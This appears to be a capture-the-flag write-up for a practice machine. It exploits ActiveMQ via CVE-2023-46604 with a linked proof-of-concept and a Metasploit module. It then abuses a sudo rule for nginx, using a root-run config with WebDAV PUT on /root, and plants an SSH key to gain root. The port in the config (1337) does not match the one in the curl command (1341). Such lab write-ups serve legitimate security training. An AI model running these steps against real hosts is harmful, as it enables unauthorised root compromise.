Nmap discovers ActiveMQ 5.15.15 which has a vulnerability for RCE in unsafe deserialization practices.
https://github.com/evkl1d/CVE-2023-46604/tree/main

Metasploit:
```
multi/misc/apache_activemq_rce_cve_2023_46604
```

After gaining shell sudo -l reveals:
```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Next step is simple as writing custom config file to access /root.
```nginx
user       root; 
worker_processes  5; 
worker_rlimit_nofile 8192;

events {
  worker_connections  1024;
}

http {
  server {
    listen       1337;
    server_name  _;

    location / {
       root /root;
       autoindex on; # lists files
       dav_methods PUT; # allows to upload files
    }
  }
}
```

Generating new ssh key pair, upload .pub to the victim and ssh-in from attacker machine:
```
ssh-keygen -t rsa -C "broker"
curl -X PUT http://10.129.230.87:1341/.ssh/authorized_keys --upload-file broker.pub
ssh -i broker root@10.129.230.87
```

